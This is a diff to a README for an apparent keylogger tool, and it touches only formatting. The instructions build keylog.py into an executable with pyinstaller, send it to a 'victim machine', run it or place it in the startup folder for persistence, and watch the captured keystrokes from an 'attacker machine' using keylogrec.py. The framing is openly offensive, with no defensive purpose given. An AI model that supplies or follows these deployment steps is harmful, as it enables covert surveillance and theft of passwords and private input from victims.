@@ -48,17 +48,19 @@ To build the exe file
                 pip install pyinstaller
 
 
-2. run "  pyinstaller --onefile {filename} "  #keylog.py
-
-3. open " dist " folder in the cloned file location
+2. run `pyinstaller --onefile {filename}`  #keylog.py
+##
+    pyinstaller --onefile keylog.py
+    
+3. open `dist` folder in the cloned file location
 
 4. exe file build successfully
 
 step 4: send the exe file(keylog.exe) to the victim machine
 
-step 5: run the exe file in victim machine or place it in starup apps folder 
+step 5: run the `keylog.exe` file in victim machine or place it in starup apps folder 
 
-step 6: run keylogrec.py in attacker machine
+step 6: run `keylogrec.py` in attacker machine
 
 step 7: monitor the terminal/output space in attacker machine
 
